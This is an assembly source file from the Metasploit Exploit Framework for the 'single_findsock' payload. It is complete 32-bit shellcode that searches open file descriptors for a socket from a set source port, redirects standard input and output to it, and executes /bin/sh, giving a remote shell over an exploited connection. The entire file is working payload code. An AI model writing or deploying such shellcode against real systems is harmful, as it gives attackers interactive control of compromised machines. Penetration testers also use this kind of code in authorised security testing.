;
;
;        Name: single_findsock
;   Qualities: Nothing Special
;     Authors: vlad902 <vlad902 [at] gmail.com>
;     Version: $Revision: 1846 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;	This payload redirects /bin/sh to a socket connected from a 
;	certain source port.
;
;;


BITS 32

section .text
global main

main:
  xor	edi, edi
  push	edi
  mov	ebp, esp

getpeername_loop:
; 32-bit is okay since the connection should be established already.
  inc	edi

  mov	esp, ebp
  push	byte 0x10
  push	esp
  push	ebp
  push	edi
  push	byte 0x1f 
  pop	eax
  push	byte 0x02
  int	0x80

  cmp	word [ebp + 2], 0x5c11
  jne	getpeername_loop

  pop	ecx

dup2_loop:
  push	ecx
  push	edi
  push	byte 0x5a 
  pop	eax
  push	ecx
  int	0x80
  dec	ecx
  jns	dup2_loop

  push	0x68732f2f
  push	0x6e69622f 

  mov	ebx, esp

  push	eax
  push	esp
  push	ebx

  mov	al, 0x3b
  push	eax
  int	0x80
